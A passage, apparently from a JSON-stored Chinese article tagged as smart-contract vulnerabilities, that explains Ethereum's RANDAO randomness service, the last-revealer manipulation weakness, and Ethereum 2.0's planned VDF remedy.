如果请求是10次，那么一次请求的价格会被降到0.04ETH\nRANDAO作为以太坊系统的基础设施，被其他的合约调用，不同的合约因为有不同的目的所以需要不同的随机值，有些需要高度加密的，比如说抽奖;有些需要稳定的回应，并且要求立即作出回应,这些合约本身的价值不高;有些需要回调函数，当随机值已经生成的时候需要接收到通知。\n但即使在这种情况下，最后一个公开随机数的人也可以在一定程度上操纵随机数。最后一个人可以选择保持沉默，以这样或那样的方式改变这个最终的随机数：房间里的最后一个人可以记住之前每个人公布的数字，如此一来，就可以知道加上（或者不加上）他提供的数字之后的最终随机数结果。如果相对于其他数字，某个数字对最后一个人更有利，那最后一个人就有动机去进行某种程度的操纵，不管程度高低。\n对于这一问题，以太坊 2.0 将通过 VDF（可验证延迟函数）来解决！\n……\n","tags":["智能合约","漏洞"]}]